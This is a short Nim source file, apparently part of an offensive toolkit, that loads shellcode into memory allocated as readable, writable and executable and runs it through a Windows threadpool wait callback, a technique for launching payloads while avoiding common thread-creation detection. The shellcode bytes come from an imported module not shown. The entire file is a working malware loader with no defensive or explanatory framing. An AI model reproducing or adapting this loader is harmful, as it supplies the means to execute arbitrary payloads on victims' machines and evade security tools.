import winim/lean
import public

proc threadpool(shellcode:cstring,shellcodelen:cint): void =
    let rPtr = VirtualAlloc(NULL,cast[SIZE_T](shellcode.len),MEM_COMMIT,PAGE_EXECUTE_READ_WRITE)
    copyMem(rPtr,shellcode,shellcodelen)
    let event = CreateEvent(NULL,FALSE,TRUE,NULL)
    let threadPoolWait = CreateThreadpoolWait(cast[PTP_WAIT_CALLBACK](rPtr),NULL,NULL)
    SetThreadpoolWait(threadPoolWait,event,NULL)
    WaitForSingleObject(event,INFINITE)

when isMainModule:
    threadpool(code,codelen)